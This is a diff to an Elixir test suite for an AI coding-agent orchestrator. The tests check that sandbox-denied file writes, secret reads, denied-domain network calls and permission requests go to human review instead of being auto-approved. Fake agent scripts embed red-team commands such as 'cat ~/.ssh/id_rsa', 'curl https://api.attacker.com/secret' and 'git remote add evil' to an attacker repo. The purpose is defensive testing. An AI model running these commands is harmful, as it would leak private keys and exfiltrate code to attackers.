@@ -1,6 +1,8 @@
 defmodule SymphonyElixir.AppServerTest do
   use SymphonyElixir.TestSupport
 
+  alias SymphonyElixir.Notifications.Notifier
+
   defmodule AlwaysErrorAudit do
     @moduledoc false
 
@@ -1178,6 +1180,521 @@ defmodule SymphonyElixir.AppServerTest do
     end
   end
 
+  test "app server routes sandbox-denied file changes through awaiting review instead of auto-approving" do
+    test_root =
+      Path.join(
+        System.tmp_dir!(),
+        "symphony-elixir-app-server-denied-file-review-#{System.unique_integer([:positive])}"
+      )
+
+    try do
+      workspace_root = Path.join(test_root, "workspaces")
+      workspace = Path.join(workspace_root, "MT-3043")
+      allowed_write_root = Path.join(workspace, "src")
+      codex_binary = Path.join(test_root, "fake-codex")
+      trace_file = Path.join(test_root, "codex-denied-file-review.trace")
+      test_pid = self()
+      File.mkdir_p!(allowed_write_root)
+
+      request_fun = fn url, payload, headers, _timeout_ms ->
+        send(test_pid, {:post, url, payload, headers})
+        {:ok, %{status: 200, body: "ok"}}
+      end
+
+      notifier_name = :"#{__MODULE__}.DeniedFileNotifier#{System.unique_integer([:positive])}"
+
+      {:ok, notifier_pid} =
+        Notifier.start_link(
+          name: notifier_name,
+          task_starter: fn fun ->
+            fun.()
+            :ok
+          end,
+          request_fun: request_fun
+        )
+
+      on_exit(fn ->
+        if Process.alive?(notifier_pid), do: GenServer.stop(notifier_pid)
+      end)
+
+      File.write!(codex_binary, """
+      #!/bin/sh
+      trace_file="#{trace_file}"
+      count=0
+      while IFS= read -r line; do
+        count=$((count + 1))
+        printf 'JSON:%s\\n' "$line" >> "$trace_file"
+
+        case "$count" in
+          1)
+            printf '%s\\n' '{"id":1,"result":{}}'
+            ;;
+          2)
+            ;;
+          3)
+            printf '%s\\n' '{"id":2,"result":{"thread":{"id":"thread-3043"}}}'
+            ;;
+          4)
+            printf '%s\\n' '{"id":3,"result":{"turn":{"id":"turn-3043","status":"inProgress","items":[]}}}'
+            printf '%s\\n' '{"id":199,"method":"item/fileChange/requestApproval","params":{"cwd":"#{workspace}","fileChangeCount":1,"changes":[{"path":"./WORKFLOW.md","kind":"modify"}]}}'
+            ;;
+          *)
+            exit 0
+            ;;
+        esac
+      done
+      """)
+
+      File.chmod!(codex_binary, 0o755)
+
+      write_workflow_file!(Workflow.workflow_file_path(),
+        workspace_root: workspace_root,
+        agent_command: "#{codex_binary} app-server",
+        agent_approval_policy: "auto_approve_all",
+        agent_turn_sandbox_policy: %{
+          type: "workspaceWrite",
+          writableRoots: [allowed_write_root],
+          readOnlyAccess: %{type: "fullAccess"},
+          networkAccess: true
+        },
+        notifications: %{
+          enabled: true,
+          channels: [
+            %{kind: "slack", webhook_url: "https://slack.test", events: ["awaiting_review"]}
+          ]
+        }
+      )
+
+      issue = %Issue{
+        id: "issue-denied-file-review",
+        identifier: "MT-3043",
+        title: "Denied file review",
+        description: "Ensure denied writes are reviewed",
+        state: "In Progress",
+        url: "https://example.org/issues/MT-3043",
+        labels: ["backend"]
+      }
+
+      assert {:error, {:approval_required, payload}} =
+               AppServer.run(workspace, "Handle denied file change approval", issue)
+
+      assert payload["method"] == "item/fileChange/requestApproval"
+
+      trace = File.read!(trace_file)
+      lines = String.split(trace, "\n", trim: true)
+
+      refute Enum.any?(lines, fn line ->
+               if String.starts_with?(line, "JSON:") do
+                 payload =
+                   line
+                   |> String.trim_leading("JSON:")
+                   |> Jason.decode!()
+
+                 payload["id"] == 199 and get_in(payload, ["result", "decision"]) == "acceptForSession"
+               else
+                 false
+               end
+             end)
+
+      assert_receive {:post, "https://slack.test", slack_payload, []}, 500
+      assert Jason.encode!(slack_payload) =~ "Awaiting review"
+      assert Jason.encode!(slack_payload) =~ "MT-3043"
+    after
+      File.rm_rf(test_root)
+    end
+  end
+
+  test "app server routes sandbox-denied secret read approvals through awaiting review" do
+    test_root =
+      Path.join(
+        System.tmp_dir!(),
+        "symphony-elixir-app-server-secret-review-#{System.unique_integer([:positive])}"
+      )
+
+    try do
+      workspace_root = Path.join(test_root, "workspaces")
+      workspace = Path.join(workspace_root, "MT-3043B")
+      codex_binary = Path.join(test_root, "fake-codex")
+      trace_file = Path.join(test_root, "codex-secret-review.trace")
+      File.mkdir_p!(workspace)
+      assert :ok = SymphonyElixir.Notifications.subscribe()
+
+      File.write!(codex_binary, """
+      #!/bin/sh
+      trace_file="#{trace_file}"
+      count=0
+      while IFS= read -r line; do
+        count=$((count + 1))
+        printf 'JSON:%s\\n' "$line" >> "$trace_file"
+
+        case "$count" in
+          1)
+            printf '%s\\n' '{"id":1,"result":{}}'
+            ;;
+          2)
+            ;;
+          3)
+            printf '%s\\n' '{"id":2,"result":{"thread":{"id":"thread-3043b"}}}'
+            ;;
+          4)
+            printf '%s\\n' '{"id":3,"result":{"turn":{"id":"turn-3043b","status":"inProgress","items":[]}}}'
+            printf '%s\\n' '{"id":200,"method":"item/commandExecution/requestApproval","params":{"command":"cat ~/.ssh/id_rsa","cwd":"#{workspace}","reason":"need secret"}}'
+            ;;
+          *)
+            exit 0
+            ;;
+        esac
+      done
+      """)
+
+      File.chmod!(codex_binary, 0o755)
+
+      write_workflow_file!(Workflow.workflow_file_path(),
+        workspace_root: workspace_root,
+        agent_command: "#{codex_binary} app-server",
+        agent_approval_policy: "auto_approve_all"
+      )
+
+      issue = %Issue{
+        id: "issue-secret-review",
+        identifier: "MT-3043B",
+        title: "Secret review",
+        description: "Ensure secret reads are reviewed",
+        state: "In Progress",
+        url: "https://example.org/issues/MT-3043B",
+        labels: ["backend"]
+      }
+
+      assert {:error, {:approval_required, payload}} =
+               AppServer.run(workspace, "Handle denied secret read approval", issue)
+
+      assert payload["method"] == "item/commandExecution/requestApproval"
+
+      trace = File.read!(trace_file)
+      lines = String.split(trace, "\n", trim: true)
+
+      refute Enum.any?(lines, fn line ->
+               if String.starts_with?(line, "JSON:") do
+                 payload =
+                   line
+                   |> String.trim_leading("JSON:")
+                   |> Jason.decode!()
+
+                 payload["id"] == 200 and Map.has_key?(payload, "result")
+               else
+                 false
+               end
+             end)
+
+      assert_receive {:notification_event,
+                      %SymphonyElixir.Notifications.Event{
+                        event: "awaiting_review",
+                        issue_identifier: "MT-3043B",
+                        reason: "sandbox_denied_path",
+                        metadata: %{access: "read", target: "~/.ssh/id_rsa"}
+                      }},
+                     500
+    after
+      File.rm_rf(test_root)
+    end
+  end
+
+  test "app server routes denied_domains command approvals through awaiting review" do
+    test_root =
+      Path.join(
+        System.tmp_dir!(),
+        "symphony-elixir-app-server-denied-domain-review-#{System.unique_integer([:positive])}"
+      )
+
+    try do
+      workspace_root = Path.join(test_root, "workspaces")
+      workspace = Path.join(workspace_root, "MT-3043C")
+      codex_binary = Path.join(test_root, "fake-codex")
+      trace_file = Path.join(test_root, "codex-denied-domain-review.trace")
+      File.mkdir_p!(workspace)
+      assert :ok = SymphonyElixir.Notifications.subscribe()
+
+      File.write!(codex_binary, """
+      #!/bin/sh
+      trace_file="#{trace_file}"
+      count=0
+      while IFS= read -r line; do
+        count=$((count + 1))
+        printf 'JSON:%s\\n' "$line" >> "$trace_file"
+
+        case "$count" in
+          1)
+            printf '%s\\n' '{"id":1,"result":{}}'
+            ;;
+          2)
+            ;;
+          3)
+            printf '%s\\n' '{"id":2,"result":{"thread":{"id":"thread-3043c"}}}'
+            ;;
+          4)
+            printf '%s\\n' '{"id":3,"result":{"turn":{"id":"turn-3043c","status":"inProgress","items":[]}}}'
+            printf '%s\\n' '{"id":201,"method":"item/commandExecution/requestApproval","params":{"command":"curl https://api.attacker.com/secret","cwd":"#{workspace}","reason":"red-team exfil"}}'
+            ;;
+          *)
+            exit 0
+            ;;
+        esac
+      done
+      """)
+
+      File.chmod!(codex_binary, 0o755)
+
+      write_workflow_file!(Workflow.workflow_file_path(),
+        workspace_root: workspace_root,
+        agent_command: "#{codex_binary} app-server",
+        agent_approval_policy: "auto_approve_all",
+        agent_network_access: %{denied_domains: ["api.attacker.com"]},
+        agent_turn_sandbox_policy: %{
+          type: "workspaceWrite",
+          writableRoots: [workspace],
+          readOnlyAccess: %{type: "fullAccess"},
+          networkAccess: true
+        }
+      )
+
+      issue = %Issue{
+        id: "issue-denied-domain-review",
+        identifier: "MT-3043C",
+        title: "Denied domain review",
+        description: "Ensure denied_domains commands are reviewed",
+        state: "In Progress",
+        url: "https://example.org/issues/MT-3043C",
+        labels: ["backend"]
+      }
+
+      assert {:error, {:approval_required, payload}} =
+               AppServer.run(workspace, "Handle denied domain approval", issue)
+
+      assert payload["method"] == "item/commandExecution/requestApproval"
+
+      trace = File.read!(trace_file)
+      lines = String.split(trace, "\n", trim: true)
+
+      refute Enum.any?(lines, fn line ->
+               if String.starts_with?(line, "JSON:") do
+                 payload =
+                   line
+                   |> String.trim_leading("JSON:")
+                   |> Jason.decode!()
+
+                 payload["id"] == 201 and Map.has_key?(payload, "result")
+               else
+                 false
+               end
+             end)
+
+      assert_receive {:notification_event,
+                      %SymphonyElixir.Notifications.Event{
+                        event: "awaiting_review",
+                        issue_identifier: "MT-3043C",
+                        reason: "sandbox_denied_domain",
+                        metadata: %{access: "network", target: "api.attacker.com"}
+                      }},
+                     500
+    after
+      File.rm_rf(test_root)
+    end
+  end
+
+  test "app server auto-approves commands containing filenames when networkAccess is blocked" do
+    test_root =
+      Path.join(
+        System.tmp_dir!(),
+        "symphony-elixir-app-server-filename-no-false-positive-#{System.unique_integer([:positive])}"
+      )
+
+    try do
+      workspace_root = Path.join(test_root, "workspaces")
+      workspace = Path.join(workspace_root, "MT-3043D")
+      codex_binary = Path.join(test_root, "fake-codex")
+      trace_file = Path.join(test_root, "codex-filename-no-fp.trace")
+      File.mkdir_p!(workspace)
+
+      File.write!(codex_binary, """
+      #!/bin/sh
+      trace_file="#{trace_file}"
+      count=0
+      while IFS= read -r line; do
+        count=$((count + 1))
+        printf 'JSON:%s\\n' "$line" >> "$trace_file"
+
+        case "$count" in
+          1)
+            printf '%s\\n' '{"id":1,"result":{}}'
+            ;;
+          2)
+            ;;
+          3)
+            printf '%s\\n' '{"id":2,"result":{"thread":{"id":"thread-3043d"}}}'
+            ;;
+          4)
+            printf '%s\\n' '{"id":3,"result":{"turn":{"id":"turn-3043d","status":"inProgress","items":[]}}}'
+            printf '%s\\n' '{"id":202,"method":"item/commandExecution/requestApproval","params":{"command":"cat package.json","cwd":"#{workspace}","reason":"benign read"}}'
+            ;;
+          5)
+            printf '%s\\n' '{"method":"turn/completed"}'
+            exit 0
+            ;;
+          *)
+            exit 0
+            ;;
+        esac
+      done
+      """)
+
+      File.chmod!(codex_binary, 0o755)
+
+      write_workflow_file!(Workflow.workflow_file_path(),
+        workspace_root: workspace_root,
+        agent_command: "#{codex_binary} app-server",
+        agent_approval_policy: "auto_approve_all",
+        agent_turn_sandbox_policy: %{
+          type: "workspaceWrite",
+          writableRoots: [workspace],
+          readOnlyAccess: %{type: "fullAccess"},
+          networkAccess: false
+        }
+      )
+
+      issue = %Issue{
+        id: "issue-filename-no-fp",
+        identifier: "MT-3043D",
+        title: "Filename no false positive",
+        description: "Filenames with extensions must not be flagged as denied domains",
+        state: "In Progress",
+        url: "https://example.org/issues/MT-3043D",
+        labels: ["backend"]
+      }
+
+      assert {:ok, _} = AppServer.run(workspace, "Handle benign command", issue)
+
+      trace = File.read!(trace_file)
+      lines = String.split(trace, "\n", trim: true)
+
+      assert Enum.any?(lines, fn line ->
+               if String.starts_with?(line, "JSON:") do
+                 payload =
+                   line
+                   |> String.trim_leading("JSON:")
+                   |> Jason.decode!()
+
+                 payload["id"] == 202 and get_in(payload, ["result", "decision"]) == "acceptForSession"
+               else
+                 false
+               end
+             end)
+    after
+      File.rm_rf(test_root)
+    end
+  end
+
+  test "app server routes sandbox-denied fileSystem permission requests through awaiting review" do
+    test_root =
+      Path.join(
+        System.tmp_dir!(),
+        "symphony-elixir-app-server-denied-fs-permission-review-#{System.unique_integer([:positive])}"
+      )
+
+    try do
+      workspace_root = Path.join(test_root, "workspaces")
+      workspace = Path.join(workspace_root, "MT-3043E")
+      allowed_write_root = Path.join(workspace, "src")
+      codex_binary = Path.join(test_root, "fake-codex")
+      trace_file = Path.join(test_root, "codex-denied-fs-permission.trace")
+      File.mkdir_p!(allowed_write_root)
+      assert :ok = SymphonyElixir.Notifications.subscribe()
+
+      File.write!(codex_binary, """
+      #!/bin/sh
+      trace_file="#{trace_file}"
+      count=0
+      while IFS= read -r line; do
+        count=$((count + 1))
+        printf 'JSON:%s\\n' "$line" >> "$trace_file"
+
+        case "$count" in
+          1)
+            printf '%s\\n' '{"id":1,"result":{}}'
+            ;;
+          2)
+            ;;
+          3)
+            printf '%s\\n' '{"id":2,"result":{"thread":{"id":"thread-3043e"}}}'
+            ;;
+          4)
+            printf '%s\\n' '{"id":3,"result":{"turn":{"id":"turn-3043e","status":"inProgress","items":[]}}}'
+            printf '%s\\n' '{"id":203,"method":"item/permissions/requestApproval","params":{"cwd":"#{workspace}","permissions":{"fileSystem":{"write":["/etc/hosts"]}}}}'
+            ;;
+          *)
+            exit 0
+            ;;
+        esac
+      done
+      """)
+
+      File.chmod!(codex_binary, 0o755)
+
+      write_workflow_file!(Workflow.workflow_file_path(),
+        workspace_root: workspace_root,
+        agent_command: "#{codex_binary} app-server",
+        agent_approval_policy: "auto_approve_all",
+        agent_turn_sandbox_policy: %{
+          type: "workspaceWrite",
+          writableRoots: [allowed_write_root],
+          readOnlyAccess: %{type: "fullAccess"},
+          networkAccess: true
+        }
+      )
+
+      issue = %Issue{
+        id: "issue-denied-fs-permission-review",
+        identifier: "MT-3043E",
+        title: "Denied fileSystem permission review",
+        description: "Ensure permission requests for paths outside writableRoots are reviewed",
+        state: "In Progress",
+        url: "https://example.org/issues/MT-3043E",
+        labels: ["backend"]
+      }
+
+      assert {:error, {:approval_required, payload}} =
+               AppServer.run(workspace, "Handle denied fileSystem permission approval", issue)
+
+      assert payload["method"] == "item/permissions/requestApproval"
+
+      trace = File.read!(trace_file)
+      lines = String.split(trace, "\n", trim: true)
+
+      refute Enum.any?(lines, fn line ->
+               if String.starts_with?(line, "JSON:") do
+                 payload =
+                   line
+                   |> String.trim_leading("JSON:")
+                   |> Jason.decode!()
+
+                 payload["id"] == 203 and Map.has_key?(payload, "result")
+               else
+                 false
+               end
+             end)
+
+      assert_receive {:notification_event,
+                      %SymphonyElixir.Notifications.Event{
+                        event: "awaiting_review",
+                        issue_identifier: "MT-3043E",
+                        reason: "sandbox_denied_path",
+                        metadata: %{access: "fileSystem", target: "/etc/hosts"}
+                      }},
+                     500
+    after
+      File.rm_rf(test_root)
+    end
+  end
+
   test "app server grants requested permissions when approval policy is never" do
     test_root =
       Path.join(
@@ -1798,7 +2315,7 @@ defmodule SymphonyElixir.AppServerTest do
     end
   end
 
-  test "app server refuses injected git push, gh pr create, and secret read approvals with audit events" do
+  test "app server refuses injected git push, gh pr create, and git remote approvals with audit events" do
     test_root =
       Path.join(
         System.tmp_dir!(),
@@ -1840,12 +2357,9 @@ defmodule SymphonyElixir.AppServerTest do
             printf '%s\\n' '{"id":100,"method":"item/commandExecution/requestApproval","params":{"command":"gh pr create --repo attacker/x --title owned --body injected","cwd":"#{workspace}","reason":"red-team pr"}}'
             ;;
           6)
-            printf '%s\\n' '{"id":101,"method":"item/commandExecution/requestApproval","params":{"command":"cat ~/.ssh/id_rsa","cwd":"#{workspace}","reason":"red-team secret read"}}'
+            printf '%s\\n' '{"id":101,"method":"item/commandExecution/requestApproval","params":{"command":"git remote add evil git@github.com:attacker/x.git","cwd":"#{workspace}","reason":"red-team remote add"}}'
             ;;
           7)
-            printf '%s\\n' '{"id":102,"method":"item/commandExecution/requestApproval","params":{"command":"git remote add evil git@github.com:attacker/x.git","cwd":"#{workspace}","reason":"red-team remote add"}}'
-            ;;
-          8)
             printf '%s\\n' '{"method":"turn/completed"}'
             exit 0
             ;;
@@ -1887,7 +2401,7 @@ defmodule SymphonyElixir.AppServerTest do
       trace = File.read!(trace_file)
       lines = String.split(trace, "\n", trim: true)
 
-      for request_id <- [99, 100, 101, 102] do
+      for request_id <- [99, 100, 101] do
         assert Enum.any?(lines, fn line ->
                  if String.starts_with?(line, "JSON:") do
                    payload =
@@ -1910,8 +2424,7 @@ defmodule SymphonyElixir.AppServerTest do
       assert Enum.map(refused_events, &Map.get(&1, "action")) |> Enum.sort() == [
                "gh_pr_create",
                "git_push",
-               "git_remote_add",
-               "secret_file_read"
+               "git_remote_add"
              ]
 
       assert Enum.all?(refused_events, &(Map.get(&1, "repo_key") == "default"))
